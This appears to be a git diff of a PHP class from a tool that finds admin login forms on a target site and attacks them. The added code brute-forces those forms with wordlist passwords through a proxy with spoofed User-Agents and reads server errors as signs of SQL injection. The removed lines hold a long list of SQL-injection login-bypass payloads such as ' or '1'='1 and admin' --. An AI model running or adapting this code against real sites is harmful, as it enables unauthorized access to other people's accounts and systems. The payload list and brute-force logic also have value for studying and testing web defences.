@@ -39,8 +39,39 @@ class Site{
 		}
 	}
 
-	public function isAdmin($body=false)
+	public function isAdmin($body=false,$action)
 	{
+		$html = new \simple_html_dom();
+		if($body)
+		{
+			$html->load($body);
+		}
+		else
+		{
+			$html->load($this->bodyTarget);
+		}
+		$nodes = $html->find("form[action=".$action."] input");
+		$isPassword=false;
+		$isUsername=false;
+		foreach($nodes as $node)
+		{
+			if($this->checkInputPassword($node))
+			{
+				$isPassword=true;
+			}
+			if($this->checkInputUsername($node))
+			{
+				$isUsername=true;
+			}
+
+
+			if($isPassword AND $isUsername)
+			{
+				return true;
+			}
+		}
+		return false;
+		/*
 		$isUrl   	= v::url()->notEmpty()->validate($this->target);
 		if($isUrl)
 		{
@@ -58,6 +89,32 @@ class Site{
 			if($existInputPassword AND $existInputUsername AND $existInputPassword['actionParentForm']==$existInputUsername['actionParentForm']){
 				return true;
 			}
+		}*/
+		return false;
+	}
+
+	public function formIsAdmin($actionForm)
+	{
+		$html = new \simple_html_dom();
+		$html->load($this->bodyTarget);
+		$isPassword=false;
+		$isUsername=false;
+		$nodes = $html->find("form[action=".$actionForm."] input");
+		foreach($nodes as $node)
+		{
+			if($this->checkInputPassword($node))
+			{
+				$isPassword=true;
+			}
+			if($this->checkInputUsername($node))
+			{
+				$isUsername=true;
+			}
+
+			if($isPassword AND $isUsername)
+			{
+				return true;
+			}
 		}
 		return false;
 	}
@@ -72,24 +129,35 @@ class Site{
 
 	public function getNameFieldUsername($actionForm)
 	{
-		$resultNameField=false;
-		$crawler 	= new Crawler($this->bodyTarget);
-		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$resultNameField,&$actionForm) {
+		$html = new \simple_html_dom();
+		$html->load($this->bodyTarget);
+		$nodes = $html->find("form[action=".$actionForm."] input");
+		foreach($nodes as $node)
+		{
+			if($this->checkInputUsername($node))
+			{
+				return array($node->name=>"");
+			}
+		}
 
-			if($node->attr('name') AND $node->attr('type')!="submit" AND $this->sanitazeActionForm($node->parents()->filter('form')->attr('action'))== $actionForm)
-			{
-				$validNameField =  $this->verifyListNamesUsername($node->attr('name'));
-				$field[$node->attr('name')]=$node->attr('value');
-			}
-			if(isset($validNameField) AND !empty($validNameField))
-			{
-				$resultNameField=$field;
-			}
-		});
-		return $resultNameField;
+		return false;
+
 	}
 	public function getNameFieldPassword($actionForm)
 	{
+		$html = new \simple_html_dom();
+		$html->load($this->bodyTarget);
+		$nodes = $html->find("form[action=".$actionForm."] input");
+		foreach($nodes as $node)
+		{
+			if($this->checkInputPassword($node))
+			{
+				return array($node->name=>"");
+			}
+		}
+
+		return false;
+		/*
 		$resultNameField=false;
 		$crawler 	= new Crawler($this->bodyTarget);
 		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$resultNameField,&$actionForm) {
@@ -104,7 +172,7 @@ class Site{
 				$resultNameField=$field;
 			}
 		});
-		return $resultNameField;
+		return $resultNameField;*/
 	}
 
 	public function getActionForm()
@@ -114,239 +182,122 @@ class Site{
 
 		$action = $crawler->filter('form')->each(function (Crawler $node, $i) use(&$result)
 		{
-			if($this->isAdmin($node->parents('form')->html()))
+			if($this->isAdmin($node->parents('form')->html(),$node->attr('action')))
 			{
-				$result= $this->sanitazeActionForm($node->attr('action'));
+				return $this->sanitazeActionForm($node->attr('action'));
 			}
 		});
 
-		return $result;
 	}
 
-	public function bruteForceAll($action,$method,$username,$password,$otherFields=array())
+	private function singleBruteForce($action,$method,$usernameField,$passwordField,$otherFields=[],$password,$username="")
 	{
-		//$proxySiteList=new ProxySiteList();
-		//echo "\n".$username." -> ".$password.";\n";
-
-		$listForInjection=$this->listOfInjectionAdmin();
-		$pageControl="";
-		$sqlInjection=false;
-		$count0=0;
+		$action=$this->sanitazeActionForm($action);
 		$count404=0;
-		foreach($listForInjection as $keyInjetion=> $injetion)
+		echo ".";
+		if(empty($username))
 		{
-			echo ".";
-			$username[key($username)]=$injetion;
-			$password[key($password)]=$injetion;
-			array(
-				'body' => array(
-					$username,
-					$password,
-				)
-			);
+			$username=$password;
+		}
+		$dataPost[key($usernameField)]=$username;
+		$dataPost[key($passwordField)]=$password;
+		$dataPost=array_merge($usernameField,$otherFields);
 
-			if( is_null($otherFields))
+		$dataToPost=['body'=>$dataPost];
+		$client 	= new Client(['defaults' => [
+			'headers' => ['User-Agent' => $this->header->getUserAgent()],
+			'proxy'   => $this->proxy,
+			'timeout' => 30
+			]
+		]);
+		$data=[];
+		$data['sqlInjection']=false;
+		if(strcasecmp($method,'post')==0){
+			try{
+				$data['body'] = $client->post($action,$dataToPost)->getBody()->getContents();
+			}catch(\Exception $e){
+				if($e->getCode()=="500")
+				{
+					$data['sqlInjection']=true;
+					$data['obs']="is probably sql injection";
+				}
+
+				echo "\n".$e->getCode()." - page not Found;\n";
+
+				if($e->getCode()=="404")
+				{
+					echo $e->getCode()." - page not Found;";
+					$count404++;
+
+					echo $count404;
+					$obs ="problem with mount url action";
+				}
+
+			}
+		}
+		return $data;
+	}
+
+	public function bruteForceAllInjection($action,$method,$usernameField,$passwordField,$otherFields=array(),$wordlist,$usernames=[])
+	{
+		//$actionFull=$this->sanitazeActionForm($action);
+
+		$pageControl="";
+		foreach($wordlist as $keyPassword=> $password)
+		{
+			if(empty($usernames))
 			{
-				$fields=array_merge($username,$password);
+				$result=$this->singleBruteForce($action,$method,$usernameField,$passwordField,$otherFields,$password);
 			}
 			else
 			{
-				$fields=array_merge($username,$password,$otherFields);
-			}
-
-			$dataToPost=['body'=>$fields];
-			$client 	= new Client(['defaults' => [
-				'headers' => ['User-Agent' => $this->header->getUserAgent()],
-				'proxy'   => $this->proxy,
-				'timeout' => 30
-				]
-			]);
-
-			if(strcasecmp($method,'post')==0){
-				try{
-					$body = $client->post($action,$dataToPost)->getBody()->getContents();
-				}catch(\Exception $e){
-					if($e->getCode()=="500")
-					{
-						$sqlInjection=true;
-						$obs="is probably sql injection";
-						$body=false;
-					}
-					if($e->getCode()=="0")
-					{
-						$count0++;
-						if($count0==3)
-						{
-							$obs ="is probably break system with force manny requisitions";
-							$body=false;
-						}
-						$sqlInjection=true;
-					}
-					echo "\n".$e->getCode()." - page not Found;\n";
-
-					if($e->getCode()=="404"){
-						echo $e->getCode()." - page not Found;";
-						$count404++;
-
-						echo $count404;
-						$obs ="problem with mount url action";
-						$body=false;
-
-						//$sqlInjection=true;
-						//break;
-					}
+				foreach($usernames as $username)
+				{
+					$result=$this->singleBruteForce($action,$method,$usernameField,$passwordField,$otherFields,$password,$username);
 
 				}
-			}else{
-				try{
-					$body = $client->get($action,array(),$dataToPost)->getBody()->getContents();
-				}catch(\Exception $e){
-					if($e->getCode()=="404"){
-						echo $e->getCode()." - page not Found;";
-						break;
-					}
-				}
 			}
-			if($keyInjetion==0)
+			if($keyPassword==0)
 			{
-				$pageControl=$body;
+				$pageControl=$result['body'];
 			}
+			$resultIsAdmin=$this->isAdmin($result['body'],$action);
 
-			$resultIsAdmin=$this->isAdmin($body);
-
-			if(((isset($body) AND $pageControl!=$body) OR $sqlInjection)AND(!$resultIsAdmin OR !$body))
+			if((isset($result['body']) AND $pageControl!=$result['body'] AND !$resultIsAdmin ) OR $result['sqlInjection'])
+			//if(((isset($result['body']) AND $pageControl!=$result['body']) OR $keyPassword)AND(!$resultIsAdmin OR !$result['body']))
 			{
 
 				echo "\n...sussefull...\n";
-				$resultData['username']=$injetion;
-				$resultData['password']=$injetion;
-				if($sqlInjection){
-					$resultData['obs']=$obs;
+				$resultData['username']=$password;
+				$resultData['password']=$password;
+				if($keyPassword){
+					$resultData['obs']=$result['obs'];
 				}
-				$sqlInjection=false;
-				$count0=0;
 				return $resultData;
 			}
+
 			//sleep(1);
 		}
 
 		return;
 	}
 
-	public function listOfInjectionAdmin()
+	public function getActionForms()
 	{
-		$injection[]="zzaa44";
-		$injection[]="admin";
-		$injection[]="adm";
-		$injection[]="' or '1'='1";
-		$injection[]="\' or \'1\'=\'1";
-		$injection[]="' or 'x'='x";
-		$injection[]="\' or \'x\'=\'x";
-		$injection[]="' or 0=0 --";
-		$injection[]="\' or 0=0 --";
-		$injection[]='" or 0=0 --';
-		$injection[]='\" or 0=0 --';
-		$injection[]="or 0=0 --";
-		$injection[]='" or 0=0 #';
-		$injection[]='\" or 0=0 #';
-		$injection[]="or 0=0 #";
-		$injection[]="' or 'x'='x";
-		$injection[]="\' or \'x\'=\'x";
-		$injection[]='" or "x"="x';
-		$injection[]='\" or \"x\"=\"x';
-		$injection[]='" or 1=1--';
-		$injection[]='\" or 1=1--';
-		$injection[]='" or "a"="a';
-		$injection[]='\" or \"a\"=\"a';
-		$injection[]='") or ("a"="a';
-		$injection[]='\") or (\"a\"=\"a';
-		$injection[]='and 1=1';
-		$injection[]="') or ('x'='x";
-		$injection[]="\') or (\'x'=\'x";
-		$injection[]="' or 1=1--";
-		$injection[]="\' or 1=1--";
-		$injection[]="or 1=1--";
-		$injection[]="' or a=a--";
-		$injection[]="\' or a=a--";
-		$injection[]="') or ('a'='a";
-		$injection[]="\') or (\'a\'='a";
-		$injection[]="hi' or 1=1 --";
-		$injection[]="hi\' or 1=1 --";
-		$injection[]="'or'1=1'";
-		$injection[]="\'or\'1=1\'";
-		$injection[]="==";
-		$injection[]="and 1=1--";
-		$injection[]="' or 'one'='one--";
-		$injection[]="\' or \'one\'=\'one--";
-		$injection[]='hi" or "a"="a';
-		$injection[]='hi\" or \"a\"=\"a';
-		$injection[]='hi" or 1=1 --';
-		$injection[]='hi\" or 1=1 --';
-		$injection[]='" or 0=0 --';
-		$injection[]='\" or 0=0 --';
-		$injection[]='" or 0=0 #';
-		$injection[]='\" or 0=0 #';
-		$injection[]='" or "x"="x';
-		$injection[]='\" or \"x\"=\"x';
-		$injection[]='" or 1=1--';
-		$injection[]='\" or 1=1--';
-		$injection[]="' or 'one'='one";
-		$injection[]="\' or \'one\'=\'one";
-		$injection[]="' and 'one'='one";
-		$injection[]="\' and \'one\'=\'one";
-		$injection[]="' and 'one'='one--";
-		$injection[]="\' and \'one\'=\'one--";
-		$injection[]="1') and '1'='1--";
-		$injection[]="1\') and \'1\'=\'1--";
-		$injection[]=") or ('1'='1--";
-		$injection[]=") or (\'1\'=\'1--";
-		$injection[]=") or '1'='1--";
-		$injection[]=") or \'1\'=\'1--";
-		$injection[]="or 1=1/*";
-		$injection[]="or 1=1#";
-		$injection[]="or 1=1--";
-		$injection[]="admin'/*";
-		$injection[]="admin\'/*";
-		$injection[]="admin' #";
-		$injection[]="admin\' #";
-		$injection[]="admin' --";
-		$injection[]="admin\' --";
-		$injection[]="') or ('a'='a";
-		$injection[]="\') or (\'a\'=\'a";
-		$injection[]="' or a=a--";
-		$injection[]="\' or a=a--";
-		$injection[]="or 1=1--";
-		$injection[]="' or 1=1--";
-		$injection[]="\' or 1=1--";
-		$injection[]="') or ('x'='x";
-		$injection[]="\') or (\'x'=\'x";
-		$injection[]="' or 'x'='x";
-		$injection[]="\' or \'x\'=\'x";
-		$injection[]="or 0=0 #";
-		$injection[]="' or 0=0 #";
-		$injection[]="\' or 0=0 #";
-		$injection[]="or 0=0 --";
-		$injection[]="' or 0=0 --";
-		$injection[]="\' or 0=0 --";
-		$injection[]="' or 'x'='x";
-		$injection[]="\' or \'x\'=\'x";
-		$injection[]="' or '1'='1";
-		$injection[]="\' or \'1\'=\'1";
-		$injection[]='" or "a"="a';
-		$injection[]='\" or \"a\"=\"a';
-		$injection[]='") or ("a"="a';
-		$injection[]='\") or (\"a\"=\"a';
-		$injection[]='hi" or "a"="a';
-		$injection[]='hi\" or \"a\"=\"a';
-		$injection[]='hi" or 1=1 --';
-		$injection[]='hi\" or 1=1 --';
-		$injection[]="hi' or 1=1 --";
-		$injection[]="hi\' or 1=1 --";
-		$injection[]="'or'1=1'";
-		$injection[]="\'or\'1=1\'";
+		$html = new \simple_html_dom();
+		$html->load($this->bodyTarget);
+		$actions=[];
 
-		return $injection;
+		$nodes = $html->find("form");
+		foreach($nodes as $node)
+		{
+			$actions[] = $node->action;
+		}
+
+		return $actions;
 	}
+
+
 
 
 	private function sanitazeActionForm($action)
@@ -373,34 +324,44 @@ class Site{
 
 	}
 
-	public function getMethodForm()
+	public function getMethodForm($actionForm)
 	{
-		$crawler 	= new Crawler($this->bodyTarget);
-		return $crawler->filter('form')->attr("method");
+		$html = new \simple_html_dom();
+		$html->load($this->bodyTarget);
+		$nodes = $html->find("form[action=".$actionForm."]");
+		foreach($nodes as $node)
+		{
+			return $node->method;
+		}
+
+		return false;
 	}
 
-	public function getOthersField($excludes)
+	public function getOthersField($actionForm,$excludes)
 	{
-
-		$crawler 	= new Crawler($this->bodyTarget);
-
-		$dataFields=array();
-
-		//$inputs2 = $crawler->filter('form')->selectButton('input[type=submit]')->form();
-		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$dataFields,&$excludes) {
-			$keyResult=$node->parents()->filter('form')->attr('action');
-			if((!$excludes OR ($key = array_key_exists($node->attr('name'), $excludes)) === false))
+		$html = new \simple_html_dom();
+		$html->load($this->bodyTarget);
+		$nodes = $html->find("form[action=".$actionForm."] input");
+		$otherFields=[];
+		foreach($nodes as $key=> $node)
+		{
+			if(!empty($node->name) AND !array_key_exists(@$node->name, $excludes) )
 			{
-				$dataFields[$this->sanitazeActionForm($keyResult)][$node->attr('name')]= $node->attr('value');
+				$otherFields[$node->name]=$node->value;
 			}
-		});
-
-		return $dataFields;
+		}
+		return $otherFields;
 	}
 
-	private function checkInputPassword($body)
+	private function checkInputPassword($node)
 	{
-		$checkPassword = false;
+		if(strcasecmp($node->type,"password")==0)
+		{
+			return true;
+		}
+		return false;
+
+		/*$checkPassword = false;
 		$crawler 	= new Crawler($body);
 
 		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$checkPassword) {
@@ -419,8 +380,9 @@ class Site{
 					$checkPassword['name']=$validPassword;
 					$checkPassword['actionParentForm']=$actionForm;
 				}
-		});
-		return $checkPassword;
+		});*/
+
+		//return $checkPassword;
 
 	}
 
@@ -434,9 +396,16 @@ class Site{
 		return false;
 	}
 
-	private function checkInputUsername($body)
+	private function checkInputUsername($node)
 	{
-		$checkUsername=false;
+		$isValid=preg_match("/(.?)user|username|login|cpf|email|mail|usuario(.?)/i",$node->name,$m);
+		if($isValid)
+		{
+			return $isValid;
+		}
+
+		return false;
+		/*$checkUsername=false;
 		$crawler 	= new Crawler($body);
 		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$checkUsername) {
 			if($node->attr('name'))
@@ -456,7 +425,7 @@ class Site{
 			}
 		});
 		return $checkUsername;
-
+		*/
 	}
 
 	private function verifyListNamesUsername($name)
@@ -469,28 +438,9 @@ class Site{
 		return false;
 	}
 
-	public function getWordListInArray($wordlist=""){
 
-		if(empty($wordlist)){
-			/*$zip = new \ZipArchive;
-			$zip->open('resource/wordlist.zip');
-			$zip->extractTo('resource/tmp/');
-			$zip->close();*/
-			$wordlist    = __DIR__.'/../resource/litleWordListPt.txt';
-			$arrWordlist = file($wordlist,FILE_IGNORE_NEW_LINES);
-			//unlink($wordlist);
-			return $arrWordlist;
-		}
 
-		$checkFileWordList  = v::file()->notEmpty()->validate($wordlist);
-		if($checkFileWordList){
-			$targetResult   = file($wordlist,FILE_IGNORE_NEW_LINES);
-			return $targetResult;
-		}
 
-		return false;
-
-	}
 
 	public function getBaseUrByUrl()
 	{
